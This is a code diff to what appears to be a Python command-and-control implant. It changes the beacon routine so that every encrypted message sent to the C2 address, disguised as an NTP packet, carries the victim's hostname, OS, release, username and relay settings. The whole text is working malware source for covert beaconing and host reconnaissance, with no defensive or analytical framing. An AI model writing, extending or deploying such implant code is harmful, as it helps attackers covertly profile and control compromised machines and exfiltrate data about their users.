@@ -340,10 +340,13 @@ def _agent_id():
 
 def _sysinfo():
     return {
-        "hostname": platform.node(),
-        "os":       platform.system(),
-        "release":  platform.release(),
-        "user":     os.environ.get("USER") or os.environ.get("USERNAME", "?"),
+        "hostname":   platform.node(),
+        "os":         platform.system(),
+        "release":    platform.release(),
+        "user":       os.environ.get("USER") or os.environ.get("USERNAME", "?"),
+        "relay_port": RELAY_PORT,
+        "worker_url": WORKER_URL,
+        "beacon_int": BEACON_INT,
     }
 
 
@@ -384,10 +387,10 @@ def _beacon(c2_ip):
     global _pending_result
 
     if _pending_result:
-        msg = {"id": AGENT_ID, "ts": int(time.time()),
+        msg = {"id": AGENT_ID, "ts": int(time.time()), "sysinfo": _sysinfo(),
                "r": {"t": _pending_result[0], "o": _pending_result[1][:120]}}
     else:
-        msg = {"id": AGENT_ID, "ts": int(time.time()), "sysinfo": {}}
+        msg = {"id": AGENT_ID, "ts": int(time.time()), "sysinfo": _sysinfo()}
 
     blob = _encrypt(msg)
     pkt  = _build_ntp(blob)
